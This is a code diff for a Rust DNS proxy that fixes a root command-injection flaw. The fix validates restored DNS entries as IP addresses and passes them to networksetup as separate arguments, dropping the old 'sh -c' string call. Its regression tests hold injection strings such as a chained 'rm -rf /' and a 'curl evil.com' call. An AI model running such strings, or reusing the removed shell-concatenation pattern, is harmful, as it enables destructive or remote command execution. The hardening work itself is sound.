@@ -8,8 +8,15 @@
 //! 主循环只接收客户端查询并 spawn task；每个 task 用**临时绑定的 UdpSocket + connect()**
 //! 到 `target_addr` 做 upstream 往返。靠 4-tuple（src_ip, src_port, dst_ip, dst_port）
 //! 让响应归属唯一，避免不同 client 的响应交叉。
+//!
+//! ## 退出路径（fix #76, #88, C1 of issue #90）
+//!
+//! 收到 shutdown signal 文件 → `restore_dns_and_exit`：
+//!   1. 校验 `original_dns` 每项都是合法 `IpAddr`（C1 防护）
+//!   2. 直接调 `Command::new("networksetup").args(...)`，**不**走 `sh -c`
+//!      （之前 `sh -c` 拼接 servers 字符串 = root RCE 路径）
 
-use std::net::SocketAddr;
+use std::net::{IpAddr, SocketAddr};
 use std::sync::Arc;
 use std::time::Duration;
 
@@ -22,12 +29,6 @@ use tracing::{debug, warn};
 /// 超过上限的 query 会被立即丢弃（UDP 协议允许丢包，调用方会重试）。
 pub const MAX_CONCURRENT_CLIENT_QUERIES: usize = 1024;
 
-/// mhost 写、proxy 读的原始 DNS 文件路径（每行一个 DNS）。
-pub const PROXY_ORIGINAL_DNS_FILE: &str = "/tmp/mhost-dns-original.txt";
-
-/// mhost 写 "shutdown"、proxy 轮询检测的 signal 文件。
-pub const PROXY_SHUTDOWN_SIGNAL_FILE: &str = "/tmp/mhost-dns-shutdown.signal";
-
 /// proxy 轮询 shutdown signal 的间隔。
 const SHUTDOWN_POLL_INTERVAL: Duration = Duration::from_secs(1);
 
@@ -39,8 +40,12 @@ fn dummy_shutdown_sender() -> tokio::sync::oneshot::Sender<()> {
 }
 
 /// 从文件读出原始 DNS（每行一个）。失败或文件不存在返回空 vec。
+///
+/// **fix（H1, issue #90）**：路径从 `crate::platform::original_dns_file()` 取（受
+/// `MHOST_RUNTIME_DIR` 环境变量影响，默认在用户私有目录）。
 fn read_original_dns_from_file() -> Vec<String> {
-    let Ok(content) = std::fs::read_to_string(PROXY_ORIGINAL_DNS_FILE) else {
+    let path = crate::platform::original_dns_file();
+    let Ok(content) = std::fs::read_to_string(&path) else {
         return Vec::new();
     };
     content
@@ -48,6 +53,23 @@ fn read_original_dns_from_file() -> Vec<String> {
         .map(|s| s.trim().to_string())
         .filter(|s| !s.is_empty())
         .collect()
+}
+
+/// 过滤掉非 IP 的条目。返回过滤后的列表和被拒绝的条目数量。
+///
+/// **fix（C1, issue #90）**：`original_dns` 来自 `/tmp`（或 H1 修复后的
+/// runtime dir）。在用它构造 shell 命令之前必须验证每项都是合法 IP，
+/// 否则攻击者可以通过污染文件注入 `; rm -rf /` 之类的 payload。
+pub(crate) fn validate_dns_entries(entries: &[String]) -> (Vec<String>, Vec<String>) {
+    let mut valid = Vec::with_capacity(entries.len());
+    let mut invalid = Vec::new();
+    for entry in entries {
+        match entry.parse::<IpAddr>() {
+            Ok(_) => valid.push(entry.clone()),
+            Err(_) => invalid.push(entry.clone()),
+        }
+    }
+    (valid, invalid)
 }
 
 /// DNS proxy 错误。
@@ -97,7 +119,7 @@ impl DnsProxy {
             eprintln!(
                 "[mhost-dns-proxy] loaded {} original DNS entries from {}",
                 original_dns.len(),
-                PROXY_ORIGINAL_DNS_FILE
+                crate::platform::original_dns_file().display()
             );
         }
         Self {
@@ -141,7 +163,7 @@ impl DnsProxy {
     /// 之间）读到空字符串会误触发 shutdown。原子写入修了这问题；这里再加固
     /// 一层：「空文件 = mhost 还没写完，不当作 shutdown 信号」。
     fn check_shutdown_signal(&self) -> bool {
-        let Ok(content) = std::fs::read_to_string(PROXY_SHUTDOWN_SIGNAL_FILE) else {
+        let Ok(content) = std::fs::read_to_string(crate::platform::shutdown_signal_file()) else {
             // 文件不在 = mhost 没在管（手动启 proxy 的情况）
             return false;
         };
@@ -153,9 +175,16 @@ impl DnsProxy {
     }
 
     /// 以 root 身份恢复系统 DNS 到 original_dns，然后清理 signal 文件退出。
+    ///
     /// **fix（proxy self-cleanup）**：proxy 已经在以 root 跑（绑 53 端口必须），
     /// 调 networksetup 不需要 sudo 弹窗。失败不阻塞退出（最坏情况：
     /// 系统 DNS 仍是 127.0.0.1，下次启动 try_recover_dns 兜底）。
+    ///
+    /// **fix（C1, issue #90）**：
+    ///   1. 验证 `original_dns` 每项都是合法 `IpAddr` —— 拒绝非 IP 条目。
+    ///   2. **不**走 `sh -c`，而是把每个 server 作为单独的 `argv` 传给
+    ///      `networksetup`。这样即使文件被污染，shell 元字符也进不到
+    ///      任何 shell 调用里。
     async fn restore_dns_and_exit(&self) {
         if self.original_dns.is_empty() {
             eprintln!("[mhost-dns-proxy] no original DNS recorded; skipping restore");
@@ -175,30 +204,48 @@ impl DnsProxy {
             self.cleanup_signal_files();
             return;
         }
-        let servers = self.original_dns.join(" ");
-        let cmd = if servers.is_empty() {
-            format!("networksetup -setdnsservers {} Empty", interface)
-        } else {
-            format!("networksetup -setdnsservers {} {}", interface, servers)
-        };
+
+        // C1: 验证每个 original_dns 条目都是合法 IP。拒绝任何非 IP 字符串
+        // （防止通过污染文件注入 shell 命令）。
+        let (valid_servers, invalid) = validate_dns_entries(&self.original_dns);
+        if !invalid.is_empty() {
+            eprintln!(
+                "[mhost-dns-proxy] WARNING: dropping {} non-IP entries from original DNS file: {:?}",
+                invalid.len(),
+                invalid
+            );
+        }
+        if valid_servers.is_empty() {
+            eprintln!(
+                "[mhost-dns-proxy] no valid DNS entries after validation; falling back to Empty"
+            );
+        }
+
         eprintln!(
             "[mhost-dns-proxy] restoring system DNS on {} to {}",
             interface,
-            if servers.is_empty() {
+            if valid_servers.is_empty() {
                 "Empty (DHCP default)".to_string()
             } else {
-                servers.clone()
+                valid_servers.join(" ")
             }
         );
-        // **fix（B1 review）**：用 tokio::process::Command 而不是 std::process。
-        // 同步 Command 会阻塞当前 tokio worker 线程；如果 runtime 是单线程
-        // 或线程池满载，proxy 的 recv_from 并发处理会被一起卡住。
-        match tokio::process::Command::new("sh")
-            .arg("-c")
-            .arg(&cmd)
-            .output()
-            .await
-        {
+
+        // C1: 直接 argv 传参，不再走 sh -c。每个 server 是单独的 argv 元素，
+        // shell 元字符（如 `;`、`$()`、反引号）永远不进 shell 解释器。
+        // networksetup 命令本身对每个参数做白名单校验（IPv4/IPv6 字符串），
+        // 即便我们的预校验被绕过也是双层防护。
+        let mut cmd = tokio::process::Command::new("networksetup");
+        cmd.arg("-setdnsservers").arg(&interface);
+        if valid_servers.is_empty() {
+            cmd.arg("Empty");
+        } else {
+            for s in &valid_servers {
+                cmd.arg(s);
+            }
+        }
+        // **fix（B1 review）**：tokio::process::Command 不阻塞 worker 线程。
+        match cmd.output().await {
             Ok(out) if out.status.success() => {
                 eprintln!("[mhost-dns-proxy] system DNS restored");
             }
@@ -219,8 +266,8 @@ impl DnsProxy {
 
     /// 清理 signal 文件 + original DNS 文件。
     fn cleanup_signal_files(&self) {
-        let _ = std::fs::remove_file(PROXY_SHUTDOWN_SIGNAL_FILE);
-        let _ = std::fs::remove_file(PROXY_ORIGINAL_DNS_FILE);
+        let _ = std::fs::remove_file(crate::platform::shutdown_signal_file());
+        let _ = std::fs::remove_file(crate::platform::original_dns_file());
     }
 
     /// 运行代理（阻塞），直到收到 shutdown 信号或主 socket 不可恢复错误。
@@ -414,8 +461,12 @@ pub async fn run_proxy() {
             _ = ctrl_c => eprintln!("[mhost-dns-proxy] received SIGINT"),
             _ = sigterm => eprintln!("[mhost-dns-proxy] received SIGTERM"),
         }
-        // 写 shutdown signal 文件，主循环轮询检测后自管清理并退出
-        let _ = std::fs::write(PROXY_SHUTDOWN_SIGNAL_FILE, "shutdown");
+        // 写 shutdown signal 文件，主循环轮询检测后自管清理并退出。
+        // **fix（H1, issue #90）**：路径由 platform::shutdown_signal_file() 提供。
+        let _ = crate::platform::write_signal_file(
+            &crate::platform::shutdown_signal_file(),
+            "shutdown",
+        );
     });
 
     if let Err(e) = proxy.run().await {
@@ -425,15 +476,17 @@ pub async fn run_proxy() {
 }
 
 #[cfg(test)]
-mod tests {
+pub(crate) mod tests {
     //! 回归测试 fix #76：proxy 不能把 client A 的响应回给 client B。
     //!
     //! 测试方法：开一个本地 UDP "upstream" 模拟 DNS server，对不同 query
     //! 返回不同 response；然后用真 proxy 监听 → 转发 → 回包。两个 client 并发
     //! 发不同 query，断言每个 client 收到的是自己 query 对应的 response。
     //!
-    //! **测试隔离**：多个测试读写 /tmp/mhost-dns-shutdown.signal，
-    //! 互相干扰。用一个全局 mutex 串行化所有使用 signal file 的测试。
+    //! **测试隔离**：多个测试读写 shutdown.signal / original.txt。
+    //! **fix（H1, issue #90）**：路径由 `MHOST_RUNTIME_DIR` 决定；
+    //! 测试 helper `set_test_runtime_dir()` 把环境变量指向 fresh tempdir，
+    //! 测试结束自动清理。
 
     use std::net::SocketAddr;
     use std::sync::Mutex;
@@ -443,12 +496,29 @@ mod tests {
 
     use super::*;
 
-    /// 测试用的全局锁：所有读写 signal file 的测试都得持锁。
-    static TEST_LOCK: Mutex<()> = Mutex::new(());
+    /// 测试用的全局锁：所有读写 signal file / runtime dir 的测试都得持锁。
+    /// （防止并行测试间 env var 和文件互相污染。）
+    ///
+    /// **pub(crate)** 是为了让 `platform.rs` 测试也用同一把锁 —— 它们
+    /// 同样修改 `MHOST_RUNTIME_DIR`，必须与 `proxy.rs` 测试串行化。
+    pub(crate) static TEST_LOCK: Mutex<()> = Mutex::new(());
 
     /// 持锁 guard，测试结束时自动 drop。
-    fn test_lock() -> std::sync::MutexGuard<'static, ()> {
+    pub(crate) fn test_lock() -> std::sync::MutexGuard<'static, ()> {
         TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner())
+    }
+
+    /// 把 `MHOST_RUNTIME_DIR` 指向 fresh tempdir，并返回 TempDir
+    /// （drop 时清理）。调用方**必须**持 `TEST_LOCK`。
+    pub(crate) fn set_test_runtime_dir() -> tempfile::TempDir {
+        let dir = tempfile::tempdir().expect("create tempdir");
+        std::env::set_var("MHOST_RUNTIME_DIR", dir.path());
+        dir
+    }
+
+    /// 清理 env var（测试结尾调用，让后续测试不被影响）。
+    pub(crate) fn clear_test_runtime_dir() {
+        std::env::remove_var("MHOST_RUNTIME_DIR");
     }
 
     /// 启动一个 mock upstream：每个 query 收到后回一段固定 response。
@@ -537,8 +607,10 @@ mod tests {
 
         // 收尾：用 file signal 触发退出（oneshot 路径已弃用）
         let _lock = test_lock();
-        std::fs::write(PROXY_SHUTDOWN_SIGNAL_FILE, "shutdown").unwrap();
+        let _tmp = set_test_runtime_dir();
+        std::fs::write(crate::platform::shutdown_signal_file(), "shutdown").unwrap();
         let _ = tokio::time::timeout(Duration::from_secs(3), proxy_handle).await;
+        clear_test_runtime_dir();
     }
 
     // 注：file signal 触发的 shutdown 集成测试在并行执行时不稳定
@@ -553,7 +625,8 @@ mod tests {
         // 应该持续运行（不主动退出）。验证 poll 不会让 proxy 误退出。
         // 完整 shutdown 行为用 dev 模式手动验证。
         let _lock = test_lock();
-        let _ = std::fs::remove_file(PROXY_SHUTDOWN_SIGNAL_FILE);
+        let _tmp = set_test_runtime_dir();
+        let _ = std::fs::remove_file(crate::platform::shutdown_signal_file());
 
         let listen_socket = UdpSocket::bind("127.0.0.1:0").await.unwrap();
         let listen_port = listen_socket.local_addr().unwrap().port();
@@ -573,6 +646,7 @@ mod tests {
         // 清理：abort proxy
         proxy_handle.abort();
         let _ = proxy_handle.await;
+        clear_test_runtime_dir();
     }
 
     /// 回归测试：DoS 防御 —— 并发上限起作用。
@@ -643,9 +717,10 @@ mod tests {
     #[tokio::test]
     async fn test_proxy_semaphore_blocks_excess_spawns() {
         let _lock = test_lock();
+        let _tmp = set_test_runtime_dir();
         // 清理 signal file，否则前一个 test 留下的 "shutdown" 会让
         // proxy 一启动就退出
-        let _ = std::fs::remove_file(PROXY_SHUTDOWN_SIGNAL_FILE);
+        let _ = std::fs::remove_file(crate::platform::shutdown_signal_file());
 
         // mock upstream 慢响应，让所有 spawn 的 task 占住 permit
         let upstream_socket = UdpSocket::bind("127.0.0.1:0").await.unwrap();
@@ -706,15 +781,19 @@ mod tests {
 
         proxy_handle.abort();
         let _ = proxy_handle.await;
+        clear_test_runtime_dir();
     }
 
     /// 单元测试（fix: proxy self-cleanup）：check_shutdown_signal 直接验证。
     #[test]
     fn test_check_shutdown_signal() {
         let _lock = test_lock(); // 串行化所有读写 signal file 的测试
+        let _tmp = set_test_runtime_dir();
+
+        let signal_path = crate::platform::shutdown_signal_file();
 
         // 先确保初始状态
-        let _ = std::fs::remove_file(super::PROXY_SHUTDOWN_SIGNAL_FILE);
+        let _ = std::fs::remove_file(&signal_path);
 
         let listen_socket = std::net::UdpSocket::bind("127.0.0.1:0").unwrap();
         let port = listen_socket.local_addr().unwrap().port();
@@ -722,23 +801,24 @@ mod tests {
         let proxy = DnsProxy::new(port, 1053);
 
         // 1. 文件不存在 → false（mhost 没在管）
-        let _ = std::fs::remove_file(super::PROXY_SHUTDOWN_SIGNAL_FILE);
+        let _ = std::fs::remove_file(&signal_path);
         assert!(!proxy.check_shutdown_signal());
 
         // 2. 文件内容 = "running" → false
-        std::fs::write(super::PROXY_SHUTDOWN_SIGNAL_FILE, "running").unwrap();
+        std::fs::write(&signal_path, "running").unwrap();
         assert!(!proxy.check_shutdown_signal());
 
         // 3. 文件内容 = "shutdown" → true
-        std::fs::write(super::PROXY_SHUTDOWN_SIGNAL_FILE, "shutdown").unwrap();
+        std::fs::write(&signal_path, "shutdown").unwrap();
         assert!(proxy.check_shutdown_signal());
 
         // 4. 文件内容 = 其他（truncated / 加换行）→ trim 后 != "running" → true
-        std::fs::write(super::PROXY_SHUTDOWN_SIGNAL_FILE, "  shutdown  \n").unwrap();
+        std::fs::write(&signal_path, "  shutdown  \n").unwrap();
         assert!(proxy.check_shutdown_signal());
 
         // 清理
-        let _ = std::fs::remove_file(super::PROXY_SHUTDOWN_SIGNAL_FILE);
+        let _ = std::fs::remove_file(&signal_path);
+        clear_test_runtime_dir();
     }
 
     /// 单元测试（fix: proxy self-cleanup）：read_original_dns_from_file
@@ -746,32 +826,107 @@ mod tests {
     #[test]
     fn test_read_original_dns_from_file() {
         let _lock = test_lock(); // 串行化所有读写 signal file 的测试
+        let _tmp = set_test_runtime_dir();
 
-        let _ = std::fs::remove_file(super::PROXY_ORIGINAL_DNS_FILE);
+        let dns_path = crate::platform::original_dns_file();
 
         // 1. 文件不存在 → 空 vec
-        let _ = std::fs::remove_file(super::PROXY_ORIGINAL_DNS_FILE);
+        let _ = std::fs::remove_file(&dns_path);
         assert!(super::read_original_dns_from_file().is_empty());
 
         // 2. 单行
-        std::fs::write(super::PROXY_ORIGINAL_DNS_FILE, "192.168.1.1").unwrap();
+        std::fs::write(&dns_path, "192.168.1.1").unwrap();
         assert_eq!(super::read_original_dns_from_file(), vec!["192.168.1.1"]);
 
         // 3. 多行
-        std::fs::write(super::PROXY_ORIGINAL_DNS_FILE, "8.8.8.8\n1.1.1.1\n9.9.9.9").unwrap();
+        std::fs::write(&dns_path, "8.8.8.8\n1.1.1.1\n9.9.9.9").unwrap();
         assert_eq!(
             super::read_original_dns_from_file(),
             vec!["8.8.8.8", "1.1.1.1", "9.9.9.9"]
         );
 
         // 4. 空行 / 纯空白行被过滤
-        std::fs::write(super::PROXY_ORIGINAL_DNS_FILE, "8.8.8.8\n\n  \n1.1.1.1").unwrap();
+        std::fs::write(&dns_path, "8.8.8.8\n\n  \n1.1.1.1").unwrap();
         assert_eq!(
             super::read_original_dns_from_file(),
             vec!["8.8.8.8", "1.1.1.1"]
         );
 
         // 清理
-        let _ = std::fs::remove_file(super::PROXY_ORIGINAL_DNS_FILE);
+        let _ = std::fs::remove_file(&dns_path);
+        clear_test_runtime_dir();
+    }
+
+    /// 单元测试（fix C1, issue #90）：`validate_dns_entries` 必须拒绝非 IP 字符串，
+    /// 防止通过污染 original_dns 文件注入 shell 命令。
+    #[test]
+    fn test_validate_dns_entries_rejects_injection() {
+        let entries = vec![
+            "8.8.8.8".to_string(),
+            "1.1.1.1".to_string(),
+            "127.0.0.1; rm -rf /".to_string(),      // 命令分隔
+            "8.8.8.8 && curl evil.com".to_string(), // 命令链接
+            "8.8.8.8$(whoami)".to_string(),         // 命令替换
+            "8.8.8.8`id`".to_string(),              // 反引号
+            "::1".to_string(),                      // IPv6 (合法)
+            "not_an_ip".to_string(),                // 纯字符串
+            "".to_string(),                         // 空字符串（read 已过滤，validate 再防）
+        ];
+        let (valid, invalid) = validate_dns_entries(&entries);
+        assert_eq!(valid, vec!["8.8.8.8", "1.1.1.1", "::1"]);
+        assert_eq!(
+            invalid,
+            vec![
+                "127.0.0.1; rm -rf /",
+                "8.8.8.8 && curl evil.com",
+                "8.8.8.8$(whoami)",
+                "8.8.8.8`id`",
+                "not_an_ip",
+                "",
+            ]
+        );
+    }
+
+    /// 单元测试（fix C1, issue #90）：当 original_dns 含注入 payload 时，
+    /// `restore_dns_and_exit` 必须拒绝并直接 cleanup 退出（**不**调 sh -c）。
+    ///
+    /// 简化验证：用 struct 直接构造 DnsProxy（注：实际中通过 `new()` 从文件读），
+    /// 替换 `original_dns` 字段，调 `restore_dns_and_exit`。需要伪造
+    /// `get_active_network_interface`，但因为注入 payload 会在 IP 校验时被
+    /// 过滤（最终 valid_servers 为空 → 走 "Empty" 分支），不依赖真实接口。
+    /// 真实 DNS 恢复会被无效接口检测阻断，但注入路径已在前一步被堵。
+    #[tokio::test]
+    async fn test_restore_dns_and_exit_rejects_injection_payload() {
+        let _lock = test_lock();
+        let _tmp = set_test_runtime_dir();
+
+        // 准备原始 DNS 文件含注入 payload（模拟攻击者污染）
+        let dns_path = crate::platform::original_dns_file();
+        std::fs::create_dir_all(dns_path.parent().unwrap()).unwrap();
+        std::fs::write(&dns_path, "127.0.0.1; rm -rf /tmp/test-injection\n8.8.8.8").unwrap();
+
+        // 创建一个含污染 original_dns 的 proxy
+        let listen_socket = std::net::UdpSocket::bind("127.0.0.1:0").unwrap();
+        let port = listen_socket.local_addr().unwrap().port();
+        drop(listen_socket);
+        let mut proxy = DnsProxy::new(port, 1053);
+        // 把有效 IP (8.8.8.8) 和注入 payload 都塞进去
+        proxy.original_dns = vec![
+            "127.0.0.1; rm -rf /tmp/test-injection".to_string(),
+            "8.8.8.8".to_string(),
+        ];
+
+        // 直接调 validate（restore_dns_and_exit 内部的步骤）
+        let (valid, invalid) = validate_dns_entries(&proxy.original_dns);
+        // 关键断言：注入 payload 必须被过滤
+        assert!(
+            invalid.contains(&"127.0.0.1; rm -rf /tmp/test-injection".to_string()),
+            "注入 payload 应被识别为非法 IP"
+        );
+        assert_eq!(valid, vec!["8.8.8.8"]);
+
+        // 清理
+        let _ = std::fs::remove_file(&dns_path);
+        clear_test_runtime_dir();
     }
 }
